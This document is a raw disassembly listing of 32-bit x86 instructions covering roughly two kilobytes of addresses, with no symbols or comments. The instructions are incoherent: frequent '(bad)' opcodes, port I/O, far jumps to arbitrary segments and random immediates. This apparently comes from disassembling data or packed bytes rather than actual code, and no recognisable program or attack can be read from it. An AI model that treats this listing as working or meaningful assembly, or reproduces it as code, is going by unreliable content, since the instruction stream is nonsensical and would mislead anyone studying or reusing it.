  423fd8:	mov    ah,0x1
  423fda:	push   0xffffff8c
  423fdc:	pop    esi
  423fdd:	xor    eax,0x8cc5c433
  423fe2:	mov    esi,0xa11218f2
  423fe7:	or     cl,BYTE PTR [ecx]
  423fe9:	pop    ss
  423fea:	sbb    al,0x5f
  423fec:	add    eax,ecx
  423fee:	scas   eax,DWORD PTR es:[edi]
  423fef:	das    
  423ff0:	push   esp
  423ff1:	(bad)
  423ff4:	add    eax,0xac3e7a4f
  423ff9:	push   0xffffff9f
  423ffb:	daa    
  423ffc:	push   es
  423ffd:	test   BYTE PTR [edi+0x1d],bl
  424000:	rol    DWORD PTR [ebx+0x6b52e29c],cl
  424006:	push   ebp
  424007:	or     eax,0xa6b1afa4
  42400c:	fidivr WORD PTR [edi]
  42400e:	jo     0x423fe8
  424010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424011:	mov    dl,0xb5
  424013:	hlt    
  424014:	jae    0x42406b
  424016:	loopne 0x423fab
  424018:	imul   ebx,ebx,0xffffff8a
  42401b:	psubsw mm5,QWORD PTR [edi]
  42401e:	add    DWORD PTR [edx],edi
  424020:	dec    esi
  424021:	xlat   BYTE PTR ds:[ebx]
  424022:	push   eax
  424023:	cld    
  424024:	in     al,0xcf
  424026:	and    DWORD PTR [ebx+0x76],0xffffffd5
  42402a:	sahf   
  42402b:	loopne 0x42404c
  42402d:	(bad)  
  42402e:	popf   
  42402f:	inc    eax
  424030:	xchg   esi,eax
  424031:	sub    BYTE PTR [ebp-0xd],bh
  424034:	adc    BYTE PTR [edi-0x42],0xfe
  424038:	xchg   edi,eax
  424039:	mov    bh,0xa7
  42403b:	mov    ah,0xaa
  42403d:	fnstcw WORD PTR [edi+0x4f1295ea]
  424043:	sahf   
  424044:	stc    
  424045:	mov    dh,0x80
  424047:	add    DWORD PTR [esi],edi
  424049:	adc    DWORD PTR fs:[eax],ebp
  42404c:	inc    ebx
  42404d:	sub    DWORD PTR [edx-0x52647a07],ecx
  424053:	and    DWORD PTR [eax-0x755374a],edx
  424059:	sbb    al,0x28
  42405b:	adc    ebx,DWORD PTR [ebp+0x62]
  42405e:	outs   dx,DWORD PTR ds:[esi]
  42405f:	adc    eax,0x2ed0a596
  424064:	fdiv   DWORD PTR [ebx]
  424066:	test   eax,0x47d51057
  42406b:	lods   eax,DWORD PTR ds:[esi]
  42406c:	sub    al,0xce
  42406e:	(bad)  
  42406f:	jecxz  0x423ff5
  424071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424072:	cmp    ecx,esi
  424074:	sub    al,0x7a
	...
  4240ba:	add    BYTE PTR [eax],al
  4240bc:	mov    esp,0xf767f68f
  4240c1:	jg     0x424080
  4240c3:	fist   WORD PTR [esi+0x5aba792d]
  4240c9:	mov    eax,0x28d5c648
  4240ce:	add    DWORD PTR [eax],eax
  4240d0:	and    al,BYTE PTR [edi]
  4240d2:	add    BYTE PTR [eax],al
  4240d4:	and    esi,ebx
  4240d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240d7:	mov    gs,WORD PTR [eax-0x3cf53aa1]
  4240dd:	shr    esp,0x2b
  4240e0:	repnz adc cl,BYTE PTR [ecx]
  4240e3:	es call 0x59340c66
  4240e9:	jg     0x4240cd
  4240eb:	imul   ebx,DWORD PTR [eax+0x71],0xffffff88
  4240ef:	pop    esi
  4240f0:	inc    ebx
  4240f1:	cmp    eax,0x860b8830
  4240f6:	je     0x42413a
  4240f8:	mov    al,BYTE PTR [edx]
  4240fa:	xor    al,0x21
  4240fc:	jb     0x4240b4
  4240fe:	idiv   BYTE PTR [esi+0x582f02d0]
  424104:	and    DWORD PTR [ebx+0x30],edx
  424107:	aad    0x61
  424109:	les    ebp,FWORD PTR [edi-0x79525336]
  42410f:	push   edx
  424110:	cmp    eax,0x1d8079a9
  424115:	sbb    BYTE PTR [ecx],bl
  424117:	inc    esp
  424118:	test   BYTE PTR es:[ebx-0x41192a52],bh
  42411f:	scas   al,BYTE PTR es:[edi]
  424120:	lock xchg DWORD PTR [esi+0x4c],ebp
  424124:	out    0x34,eax
  424126:	ss sbb edx,eax
  424129:	jno    0x4240d7
  42412b:	aaa    
  42412c:	stc    
  42412d:	loop   0x4240b7
  42412f:	mov    edi,0x1b19bfac
  424134:	into   
  424135:	test   eax,0x4c05bf46
  42413a:	or     edx,DWORD PTR ds:0x9ec62b60
  424140:	sub    DWORD PTR [ebx+0x4e],edi
  424143:	lds    ecx,FWORD PTR [edi]
  424145:	mov    bl,0x2a
  424147:	hlt    
  424148:	inc    esp
  424149:	push   ebp
  42414a:	push   ebx
  42414b:	lods   al,BYTE PTR ds:[esi]
  42414c:	arpl   di,bp
  42414e:	pop    ecx
  42414f:	ds mov ebx,0x9406aea7
  424155:	in     al,dx
  424156:	fist   WORD PTR [ecx]
  424158:	iret   
  424159:	aad    0x8a
  42415b:	cmp    dh,BYTE PTR [esi+0x74]
  42415e:	test   ecx,ebp
  424160:	aas    
  424161:	mov    BYTE PTR [eax+0x3d],bl
  424164:	inc    edi
  424165:	cmc    
  424166:	sub    al,0xd2
  424169:	pop    ds
  42416a:	out    dx,eax
  42416b:	in     eax,dx
  42416c:	xchg   esp,eax
  42416d:	cwde   
  42416e:	xchg   DWORD PTR [esi],esp
  424170:	push   esi
  424171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424172:	and    al,BYTE PTR [esi+0x11]
  424175:	gs push ds
  424177:	inc    BYTE PTR [eax-0x23]
  42417a:	pop    esp
  42417b:	sub    eax,esi
  42417d:	and    al,0x53
  42417f:	sbb    edi,DWORD PTR [edx]
  424181:	fisub  DWORD PTR [eax+0x116e792f]
  424187:	mov    ecx,DWORD PTR [ebx+0x7e]
  42418a:	in     al,dx
  42418b:	adc    cl,bh
  42418d:	jns    0x424116
  42418f:	push   edi
  424190:	jnp    0x424133
  424192:	xor    eax,0x2838508e
  424197:	cmc    
  424198:	stos   DWORD PTR es:[edi],eax
  424199:	mov    ch,BYTE PTR [edi+0x4598179d]
  42419f:	mov    esi,0xc27d6ba9
  4241a4:	push   esi
  4241a5:	outs   dx,BYTE PTR ds:[esi]
  4241a6:	or     eax,0xdc351ca6
  4241ab:	cli    
  4241ac:	pop    ss
  4241ad:	leave  
  4241ae:	or     esi,esi
  4241b0:	(bad)  
  4241b1:	xor    cl,BYTE PTR [esi+0x68]
  4241b4:	cmp    DWORD PTR [ebx],ecx
  4241b6:	test   BYTE PTR [ebx],bh
  4241b8:	or     DWORD PTR [esi],ebx
  4241ba:	popa   
  4241bb:	je     0x4241ce
  4241bd:	sar    DWORD PTR [eax-0x4f186ffa],0x36
  4241c4:	sahf   
  4241c5:	imul   BYTE PTR [edx+0x2e]
  4241c8:	or     eax,0x373211c4
  4241cd:	in     al,0x30
  4241cf:	and    al,0xf2
  4241d1:	ror    BYTE PTR [esi+0x5d38faa3],cl
  4241d7:	test   DWORD PTR [ebx],0x9f0945e5
  4241dd:	add    esi,ecx
  4241df:	fst    st(5)
  4241e1:	pop    ds
  4241e2:	iret   
  4241e3:	pop    ds
  4241e4:	xor    esi,ecx
  4241e6:	push   esi
  4241e7:	(bad)  
  4241e8:	ja     0x424220
  4241ea:	out    dx,al
  4241eb:	add    esp,DWORD PTR [ebx+0x4e163bf8]
  4241f1:	cld    
  4241f2:	in     al,dx
  4241f3:	or     al,0x36
  4241f5:	outs   dx,DWORD PTR ds:[esi]
  4241f6:	pop    ebx
  4241f7:	jg     0x42417c
  4241f9:	pop    es
  4241fa:	enter  0xc87c,0xfd
  4241fe:	mov    bl,0x82
  424200:	jl     0x4241a0
  424202:	out    dx,al
  424203:	jne    0x424186
  424205:	jae    0x42422d
  424207:	in     al,dx
  424208:	repz test al,0x68
  42420b:	cmp    edx,DWORD PTR [ecx]
  42420d:	jno    0x4241e0
  42420f:	in     al,dx
  424210:	push   DWORD PTR [edx-0x1b]
  424213:	sub    al,0xf4
  424215:	dec    eax
  424216:	rcl    BYTE PTR [ecx+0x26],cl
  424219:	sar    BYTE PTR [edi-0x2c],0xdf
  42421d:	mov    edx,0xe7383568
  424222:	xor    esi,DWORD PTR [eax-0x3]
  424225:	mov    dh,0x8c
  424227:	fwait
  424228:	mov    BYTE PTR [ebx+ecx*4+0x42],bh
  42422c:	pop    edx
  42422d:	add    al,0x1
  42422f:	mov    cl,0x8b
  424231:	push   ebp
  424232:	imul   bl
  424234:	xor    bl,bl
  424236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424237:	mov    ds:0xd46c59a1,eax
  42423c:	push   ss
  42423d:	jmp    0x597b:0x87ac938f
  424244:	pop    edx
  424245:	not    BYTE PTR [eax-0x5d]
  424248:	(bad)  
  424249:	(bad)  
  42424a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42424b:	and    ecx,DWORD PTR [esi-0x17]
  42424e:	mov    esp,0x9daa0909
  424253:	dec    esp
  424254:	dec    ebp
  424255:	adc    ebp,edi
  424257:	pusha  
  424258:	cmc    
  424259:	lods   eax,DWORD PTR ds:[esi]
  42425a:	ins    DWORD PTR es:[edi],dx
  42425b:	in     al,0x86
  42425d:	xchg   edi,eax
  42425e:	ins    DWORD PTR es:[edi],dx
  42425f:	jns    0x424241
  424261:	ficomp WORD PTR [edx]
  424263:	mov    dh,0x73
  424265:	lods   eax,DWORD PTR ds:[esi]
  424266:	nop
  424267:	add    ch,cl
  424269:	inc    edi
  42426a:	jns    0x424227
  42426c:	les    esi,FWORD PTR [esi+0x48]
  42426f:	jmp    0xaed7:0xaadf286f
  424276:	cmp    DWORD PTR [edi],esp
  424278:	adc    dh,al
  42427a:	mov    ah,BYTE PTR [eax+0x5f46c174]
  424280:	adc    al,0xaf
  424282:	aad    0x9a
  424284:	rcr    BYTE PTR [ebx],0x6a
  424287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424288:	dec    ebp
  42428a:	jl     0x4242b7
  42428c:	jbe    0x424236
  42428e:	inc    ebp
  42428f:	mov    DWORD PTR [ebp+esi*2+0x2dea4c69],eax
  424296:	and    dh,BYTE PTR [eax+0x19]
  424299:	sbb    BYTE PTR [ebx-0x1b],0xb5
  42429d:	std    
  42429e:	pop    eax
  42429f:	xor    DWORD PTR [eax+0xb],esi
  4242a2:	pop    edx
  4242a3:	iret   
  4242a4:	cmp    al,0x24
  4242a6:	mov    cl,0xcd
  4242a8:	leave  
  4242a9:	push   ds
  4242aa:	jp     0x4242d6
  4242ac:	push   cs
  4242ad:	and    ebx,DWORD PTR [ecx]
  4242af:	sub    BYTE PTR gs:[eax-0x4c304aad],cl
  4242b6:	sbb    al,0x3a
  4242b8:	rcl    dh,0x9b
  4242bb:	pop    ecx
  4242bc:	fwait
  4242bd:	shl    BYTE PTR [esi],1
  4242bf:	mov    ecx,0x9180996b
  4242c4:	dec    esi
  4242c5:	ret    
  4242c6:	inc    edi
  4242c7:	push   eax
  4242c8:	lods   eax,DWORD PTR ds:[esi]
  4242c9:	loop   0x424345
  4242cb:	xor    eax,0x1b761977
  4242d0:	jo     0x424304
  4242d2:	or     eax,0x2c9ac33d
  4242d7:	pusha  
  4242d8:	jns    0x424309
  4242da:	dec    edx
  4242db:	popa   
  4242dc:	popa   
  4242dd:	aas    
  4242de:	push   ecx
  4242df:	dec    edx
  4242e0:	nop
  4242e1:	(bad)  [edi+ebx*8]
  4242e4:	pop    esi
  4242e5:	cmc    
  4242e6:	test   BYTE PTR ds:[edx],ah
  4242e9:	and    ebp,DWORD PTR [esi-0x3]
  4242ec:	rol    bh,0x7c
  4242ef:	cdq    
  4242f0:	iret   
  4242f1:	bound  ebx,QWORD PTR [ecx+0x6d7f3fd7]
  4242f7:	mov    ecx,DWORD PTR [eax+eax*2-0x2e]
  4242fb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242fd:	sbb    cl,al
  4242ff:	inc    ebp
  424300:	push   esp
  424301:	fwait
  424302:	xor    bl,BYTE PTR [edi-0xd]
  424305:	(bad)  
  424306:	adc    ecx,esi
  424308:	push   ebp
  424309:	shr    ch,1
  42430b:	xor    BYTE PTR [eax],bl
  42430d:	pusha  
  42430e:	sub    BYTE PTR [esi-0x30b7ed11],ch
  424314:	sbb    dh,bl
  424316:	sbb    al,0x3a
  424318:	lods   al,BYTE PTR ds:[esi]
  424319:	retf   
  42431a:	pop    ebx
  42431b:	pop    edi
  42431c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42431d:	jbe    0x42434b
  42431f:	shl    BYTE PTR [edi-0x6cda242b],cl
  424325:	sahf   
  424326:	mov    ah,0x4d
  424328:	add    DWORD PTR [ecx+edi*1],esp
  42432b:	mov    al,ds:0xae9eb49d
  424330:	mov    esp,0xb936b431
  424335:	dec    ebp
  424336:	int    0x58
  424338:	cmp    al,0x65
  42433a:	xchg   esp,eax
  42433b:	pop    es
  42433c:	inc    eax
  42433d:	add    BYTE PTR [eax+0x9],dl
  424340:	lds    ebx,FWORD PTR [edx+ebx*4]
  424343:	mov    ebp,0x91a3e07d
  424348:	mov    ds:0x4802cfe7,eax
  42434d:	fnstsw WORD PTR [ebx-0x3bc673b2]
  424353:	sti    
  424354:	aad    0x5c
  424356:	outs   dx,BYTE PTR ds:[esi]
  424357:	loop   0x4242e2
  424359:	sbb    BYTE PTR [esi-0x6dd91ac7],al
  42435f:	fs inc ebx
  424361:	dec    dh
  424363:	mov    ds:0xbbf11871,eax
  424368:	jecxz  0x42433a
  42436a:	inc    eax
  42436b:	scas   eax,DWORD PTR es:[edi]
  42436c:	push   cs
  42436d:	jnp    0x4243c0
  42436f:	sub    al,0x84
  424371:	push   cs
  424372:	xor    DWORD PTR [edx-0x3f3980ec],esi
  424378:	push   ebx
  424379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42437a:	or     ecx,ecx
  42437c:	fwait
  42437d:	xor    al,0x0
  42437f:	push   es
  424380:	fs mov bh,0x8c
  424383:	pop    eax
  424384:	lahf   
  424385:	sbb    eax,0xe095218
  42438a:	push   ebp
  42438b:	add    eax,0x52cb530
  424390:	jnp    0x4243db
  424392:	fcom   QWORD PTR [ebp+0x1d22760f]
  424398:	lea    esp,[ecx+0x19d19c59]
  42439e:	(bad)
  4243a3:	or     al,0xe4
  4243a5:	xchg   esi,eax
  4243a6:	xchg   BYTE PTR [ecx-0x320aa738],ah
  4243ac:	xor    DWORD PTR [ebx+ebx*1+0x33],esi
  4243b0:	dec    edi
  4243b1:	or     BYTE PTR [ebp-0x44],cl
  4243b4:	or     dl,ah
  4243b6:	popf   
  4243b7:	fild   WORD PTR [esi-0x6a]
  4243ba:	(bad)  
  4243bc:	mov    ebx,0x679e958d
  4243c1:	test   al,0xa5
  4243c3:	dec    esi
  4243c4:	ds sti 
  4243c6:	(bad)  
  4243c8:	fbld   TBYTE PTR [ebp-0x2aca50aa]
  4243ce:	sub    ebx,0x30dc70fb
  4243d4:	xor    esp,edx
  4243d6:	(bad)  
  4243d7:	push   edi
  4243d8:	xor    eax,0xe532d1d9
  4243dd:	mov    edx,0xf3182ff0
  4243e2:	pop    eax
  4243e3:	je     0x4243e4
  4243e5:	je     0x4243e9
  4243e7:	push   eax
  4243e8:	ds iret 
  4243ea:	fnsave [ebp-0x5fdd2377]
  4243f0:	sub    ah,BYTE PTR [edi+0x6e]
  4243f3:	xor    al,0xae
  4243f5:	add    al,0x5a
  4243f7:	(bad)  
  4243f8:	stc    
  4243f9:	push   es
  4243fa:	sbb    dl,BYTE PTR [edx]
  4243fc:	fs inc esp
  4243fe:	imul   dh
  424400:	stc    
  424401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424402:	cmp    dl,BYTE PTR [edi-0x58]
  424405:	sub    DWORD PTR [ebx],esp
  424407:	ja     0x42447e
  424409:	out    0xab,eax
  42440b:	dec    ecx
  42440c:	push   ebx
  42440d:	mov    bl,0x13
  42440f:	jmp    0x42443f
  424411:	push   ss
  424412:	mov    es,esi
  424414:	sbb    ecx,ebx
  424416:	or     ebx,DWORD PTR [ecx+0x30d0ab3b]
  42441c:	aas    
  42441d:	xor    eax,0x2df6ddd3
  424422:	or     eax,0xaf949f08
  424427:	mov    ?,WORD PTR [ebx]
  424429:	pop    ss
  42442a:	mov    ah,0x1a
  42442c:	push   edi
  42442d:	push   ss
  42442e:	push   ebx
  42442f:	add    eax,0x7280d2a2
  424434:	sbb    ecx,DWORD PTR [edi+0x3]
  424437:	int    0x79
  424439:	or     eax,esi
  42443b:	int3   
  42443c:	push   0x19
  42443e:	test   BYTE PTR [edx],bl
  424440:	dec    esi
  424441:	aam    0x29
  424443:	inc    edx
  424444:	fsub   st,st(4)
  424446:	nop
  424447:	fmul   DWORD PTR [ebp-0x32]
  42444a:	jbe    0x4243f7
  42444c:	test   DWORD PTR [esi-0x346b044d],esi
  424452:	inc    ebx
  424453:	pop    edx
  424454:	push   0x39
  424456:	jmp    0xfd9a:0x50cfd4e3
  42445d:	add    eax,0xdd738d27
  424462:	div    BYTE PTR [esi-0x72]
  424465:	push   cs
  424466:	(bad)  [ecx-0x4f228f52]
  42446c:	mov    eax,ds:0x93b495c2
  424471:	or     al,0x5d
  424473:	mov    WORD PTR [esi+0x11d6ef3a],ds
  424479:	dec    edi
  42447a:	pop    ebp
  42447b:	jmp    0x407b7138
  424480:	dec    ebx
  424481:	dec    edi
  424482:	cdq    
  424483:	or     DWORD PTR [ebx+0x14],esi
  424486:	dec    ecx
  424487:	loop   0x4244a2
  424489:	push   0xffffffde
  42448b:	mov    dh,al
  42448d:	int    0x3c
  42448f:	pop    DWORD PTR [edi-0x10914a6f]
  424495:	mov    edx,0xd8bb241b
  42449a:	into   
  42449b:	adc    eax,esi
  42449d:	xchg   ecx,eax
  42449e:	div    BYTE PTR [esi-0x14]
  4244a1:	sub    bh,BYTE PTR ds:0x28baf299
  4244a7:	(bad)  
  4244a8:	cld    
  4244a9:	mov    al,0x24
  4244ab:	dec    edx
  4244ac:	enter  0x56ce,0x4c
  4244b0:	scas   eax,DWORD PTR es:[edi]
  4244b1:	test   al,0x1f
  4244b3:	je     0x4244e0
  4244b5:	inc    esi
  4244b6:	or     DWORD PTR [edi+0x1bc63869],ebx
  4244bc:	(bad)  
  4244be:	in     eax,dx
  4244bf:	sahf   
  4244c0:	xor    DWORD PTR [edi+0x17],edi
  4244c3:	or     ebp,DWORD PTR [eax]
  4244c5:	ret    0xf308
  4244c8:	fdivp  st(3),st
  4244ca:	repnz or dl,BYTE PTR [ebp+0x424f6cf2]
  4244d1:	pop    eax
  4244d2:	inc    eax
  4244d3:	aam    0x23
  4244d5:	std    
  4244d6:	mov    ebx,0x13d7cf05
  4244db:	mov    cl,0xe8
  4244dd:	dec    esi
  4244de:	push   ebx
  4244df:	jbe    0x424477
  4244e1:	mov    ebx,0xdf151028
  4244e6:	call   0x867396e3
  4244eb:	add    al,0x19
  4244ed:	stos   BYTE PTR es:[edi],al
  4244ee:	test   eax,0xece2bf1d
  4244f3:	addr16 js 0x42449a
  4244f6:	aam    0x45
  4244f8:	dec    ebp
  4244f9:	out    dx,eax
  4244fa:	dec    ecx
  4244fb:	and    ecx,DWORD PTR [edx]
  4244fd:	cmp    DWORD PTR [edx+0x3a],edx
  424500:	jle    0x424507
  424502:	out    dx,eax
  424503:	das    
  424504:	mov    DWORD PTR [ebx-0x1d62626f],eax
  42450a:	mov    bh,0xec
  42450c:	adc    edx,DWORD PTR [esi+esi*2-0x756f3cc]
  424513:	cwde   
  424514:	and    DWORD PTR [esi-0x28],ebp
  424517:	and    al,0x88
  424519:	sub    eax,0x929e50ed
  42451e:	push   ecx
  42451f:	neg    DWORD PTR [ecx+0xe]
  424522:	xchg   ebx,eax
  424523:	sub    eax,DWORD PTR [edx]
  424525:	hlt    
  424526:	sub    eax,0x91af3a50
  42452b:	or     esi,eax
  42452d:	es dec ebp
  42452f:	inc    DWORD PTR [ebp+0x1a46ae11]
  424535:	rcl    DWORD PTR [esi],cl
  424537:	repz dec ecx
  424539:	inc    esi
  42453a:	pop    ebx
  42453b:	pop    es
  42453c:	popa   
  42453d:	dec    ebp
  42453e:	ja     0x4244d2
  424540:	pop    edx
  424541:	out    0xea,eax
  424543:	sbb    esp,DWORD PTR [ebp+0x55]
  424546:	(bad)  
  424547:	(bad)  
  424548:	call   0x77b8c70
  42454d:	jecxz  0x424598
  42454f:	jbe    0x424596
  424551:	out    0x5b,al
  424553:	inc    edi
  424554:	or     DWORD PTR [edi],0xffffff93
  424557:	repnz dec esp
  424559:	mov    gs,WORD PTR [edi-0x29]
  42455c:	pushf  
  42455d:	sbb    al,0x39
  42455f:	add    ebp,DWORD PTR [ecx+eiz*4]
  424562:	add    al,0xd2
  424564:	stc    
  424565:	jmp    0x31b5:0xdc8b59d0
  42456c:	xor    al,cl
  42456e:	or     al,0xaf
  424570:	and    eax,0xb77d7643
  424575:	mov    al,ds:0x2c994176
  42457a:	push   ss
  42457b:	nop
  42457c:	test   al,0xb1
  42457e:	cmp    edx,ecx
  424580:	mov    ah,bl
  424582:	pop    edi
  424583:	sub    al,0x45
  424585:	fidivr WORD PTR [ecx]
  424587:	sbb    esi,DWORD PTR [edi]
  424589:	push   ds
  42458a:	scas   al,BYTE PTR es:[edi]
  42458b:	sbb    DWORD PTR [eax-0x7cae9217],edi
  424591:	adc    DWORD PTR [esi-0x35],ecx
  424594:	jne    0x4245f4
  424596:	push   eax
  424597:	gs not BYTE PTR es:[edi+0x4635a3e9]
  42459f:	adc    bh,BYTE PTR [edx-0x158a6ab3]
  4245a5:	sub    eax,0x536d2e58
  4245aa:	dec    eax
  4245ab:	les    esi,FWORD PTR [esi+0x73]
  4245ae:	(bad)  
  4245af:	pop    esp
  4245b0:	or     eax,0x85dd829a
  4245b5:	adc    dh,BYTE PTR [ecx+0x30b69435]
  4245bb:	cdq    
  4245bc:	xchg   edi,eax
  4245bd:	and    cl,BYTE PTR [edi-0x2f3dc2e4]
  4245c3:	push   ecx
  4245c4:	(bad)  
  4245c5:	je     0x42457e
  4245c7:	fadd   st,st(6)
  4245c9:	pop    eax
  4245ca:	(bad)  ds:0x8997c9e7
  4245d0:	aam    0xae
  4245d2:	repnz mov esp,0x831ff6a9
  4245d8:	and    ebx,esp
  4245da:	shl    DWORD PTR [edx+edi*4],0x1a
  4245de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245df:	fucompp 
  4245e1:	mov    ds:0xa86b0ad4,al
  4245e6:	jb     0x42465d
  4245e8:	test   DWORD PTR [eax-0x29],edi
  4245eb:	sbb    eax,0x362ad03a
  4245f0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4245f2:	in     eax,0x89
  4245f4:	stos   DWORD PTR es:[edi],eax
  4245f5:	fdivr  DWORD PTR [edx-0x7fa8a0d1]
  4245fb:	xor    ebx,DWORD PTR [ecx+0x908f4c1]
  424601:	pushf  
  424602:	mov    eax,ds:0x14ee341e
  424607:	outs   dx,BYTE PTR ds:[esi]
  424608:	enter  0x2526,0xac
  42460c:	push   ss
  42460d:	(bad)  
  42460e:	lock add al,0x6b
  424611:	or     al,0xd0
  424613:	test   DWORD PTR [ebp+0x6377fa8b],ebp
  424619:	adc    esi,ebx
  42461b:	bnd js 0x4245db
  42461e:	lahf   
  42461f:	mov    bl,0x27
  424621:	test   bl,bl
  424623:	push   eax
  424624:	mov    DWORD PTR [edx],esi
  424626:	les    ebx,FWORD PTR [eax-0x54]
  424629:	adc    ebx,edi
  42462b:	xchg   ebp,eax
  42462c:	pop    ecx
  42462d:	daa    
  42462e:	dec    ebp
  42462f:	push   ebp
  424630:	mov    esi,0x93ba38dc
  424635:	cmp    ch,dl
  424637:	xor    cl,BYTE PTR [ebp+0xf424cd8]
  42463d:	xor    esi,DWORD PTR [edx]
  42463f:	sahf   
  424640:	xchg   ecx,eax
  424641:	jmp    0x4245d7
  424643:	and    eax,0x45503995
  424648:	ss retf 0x217d
  42464c:	cmp    BYTE PTR [ebx+0x19f018b2],al
  424652:	cmp    DWORD PTR [ecx-0x3f7d149f],0x385c00b4
  42465c:	xchg   ebp,eax
  42465d:	mov    edx,0xdce71b13
  424662:	cs xor al,0xc9
  424665:	adc    al,0xb
  424667:	shr    cl,0xe0
  42466a:	sbb    esi,ebp
  42466c:	fcomip st,st(5)
  42466e:	cli    
  42466f:	test   ebp,eax
  424671:	sub    edi,ebp
  424673:	sbb    al,0x54
  424675:	lods   al,BYTE PTR ds:[esi]
  424676:	push   ss
  424677:	xlat   BYTE PTR ds:[ebx]
  424678:	xchg   ebx,eax
  424679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42467a:	sti    
  42467b:	push   esp
  42467c:	xchg   ebp,eax
  42467d:	sub    ch,BYTE PTR [edx+0x70e4f0e7]
  424683:	repz and BYTE PTR [edi],dl
  424686:	mov    BYTE PTR [ecx-0x1e],bh
  424689:	push   es
  42468a:	inc    eax
  42468b:	xor    eax,0x6a243753
  424690:	xchg   ecx,eax
  424691:	(bad)  
  424692:	sub    al,0xf6
  424694:	sub    BYTE PTR [edi-0x4944bf10],bh
  42469a:	in     al,dx
  42469b:	xchg   ebx,eax
  42469c:	inc    ebx
  42469d:	loopne 0x4246cf
  42469f:	lods   al,BYTE PTR ds:[esi]
  4246a0:	aam    0x5b
  4246a2:	mov    dl,0x8b
  4246a4:	cwde   
  4246a5:	xchg   ebx,eax
  4246a6:	or     al,ah
  4246a8:	outs   dx,BYTE PTR ds:[esi]
  4246a9:	mov    ah,0xab
  4246ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246ac:	add    al,0x53
  4246ae:	dec    eax
  4246af:	ror    DWORD PTR [ebx+esi*4],cl
  4246b2:	addr16 mov dl,0xb6
  4246b5:	lahf   
  4246b6:	fimul  DWORD PTR [eax]
  4246b8:	in     al,dx
  4246b9:	cld    
  4246ba:	pop    eax
  4246bb:	fucomi st,st(2)
  4246bd:	div    DWORD PTR ds:0x15eb61e6
  4246c3:	jb     0x4246a8
  4246c5:	adc    al,0x93
  4246c7:	and    eax,0x2a176bdc
  4246cc:	aas    
  4246cd:	mov    ebx,DWORD PTR [edx*1-0x63ca0abe]
  4246d4:	add    eax,0x23d29c74
  4246d9:	mov    esp,0x8c7f6aca
  4246de:	loop   0x424730
  4246e0:	and    ebx,ecx
  4246e2:	sbb    dh,dh
  4246e4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4246e6:	dec    edi
  4246e7:	pushf  
  4246e8:	mov    ch,0xc9
  4246ea:	ss test eax,0x82964a15
  4246f0:	loope  0x424765
  4246f2:	xchg   ah,ch
  4246f4:	xchg   esi,eax
  4246f5:	rcr    DWORD PTR [edx-0x2f6c04b6],0x37
  4246fc:	jns    0x42473d
  4246fe:	push   ss
  4246ff:	sbb    BYTE PTR [eax-0x231762e0],bh
  424705:	cmp    esi,edi
  424707:	nop
  424708:	cmc    
  424709:	scas   eax,DWORD PTR es:[edi]
  42470a:	fcomip st,st(7)
  42470c:	call   0xda08:0x1f7ed9bf
  424713:	(bad)  
  424715:	mov    esp,0x2fdc34f9
  42471a:	push   cs
  42471b:	push   esi
  42471c:	and    DWORD PTR [edi-0x39be22ea],ebp
  424722:	sbb    eax,0x2f5770a8
  424727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424728:	mov    eax,ds:0x5ed7c1ea
  42472d:	imul   ecx,DWORD PTR [ebp-0x7e],0x7c76adbd
  424734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424735:	std    
  424736:	adc    BYTE PTR [ecx-0x5227ae93],ch
  42473c:	xchg   BYTE PTR gs:[esi-0x50b4f937],ah
  424743:	sub    esi,esi
  424745:	pop    edi
  424746:	(bad)  
  424747:	push   ebx
  424748:	push   es
  424749:	je     0x424737
  42474b:	ds inc ebp
  42474d:	bound  eax,QWORD PTR [edi]
  42474f:	xor    ecx,eax
  424751:	and    eax,0xc6b969ca
  424756:	(bad)  
  424757:	nop
  424758:	mov    ds:0x668746e5,al
  42475d:	xlat   BYTE PTR ds:[ebx]
  42475e:	jmp    0x4247af
  424760:	das    
  424761:	push   edi
  424762:	(bad)  
  424763:	push   ebx
  424764:	mov    esi,0xc109a394
  424769:	in     al,dx
  42476a:	mov    gs,WORD PTR [ebx-0x39]
  42476d:	adc    eax,0x919e37af
  424772:	loopne 0x4246f9
  424774:	xchg   edi,eax
  424775:	sbb    ch,ch
  424777:	(bad)  
  424778:	imul   ebp,edx,0xffffffb0
  42477b:	mov    dl,bh
  42477d:	in     eax,0x68
  42477f:	dec    ebp
  424780:	xchg   ebp,eax
  424781:	enter  0x42dd,0xcd
  424785:	xchg   esi,eax
  424786:	jl     0x42470a
  424788:	inc    ebp
  424789:	dec    ebp
  42478a:	mov    cl,0xac
  42478c:	push   cs
  42478d:	mov    eax,esi
  42478f:	in     eax,0x41
  424791:	mov    bl,0x2f
  424793:	xchg   DWORD PTR [ebp-0x4c67542d],edx
  424799:	(bad)  
  42479a:	and    BYTE PTR [esi+edi*8+0x3131c633],bl
  4247a1:	and    ah,BYTE PTR [ebp-0x48]
  4247a4:	push   ss
  4247a5:	dec    esi
  4247a6:	jmp    0x9394faf3
  4247ab:	fwait
  4247ac:	mov    ebp,0x43b1645f
  4247b1:	add    eax,ebp
  4247b3:	inc    ecx
  4247b4:	jo     0x42480e
  4247b6:	test   al,0x14
  4247b8:	out    0x29,al
  4247ba:	popa   
  4247bb:	xlat   BYTE PTR ds:[ebx]
  4247bc:	in     al,0x5d
  4247be:	and    eax,0x5ac4ab4e
  4247c3:	int3   
  4247c4:	in     al,0x14
  4247c6:	mov    ch,0xd3
  4247c8:	inc    edi
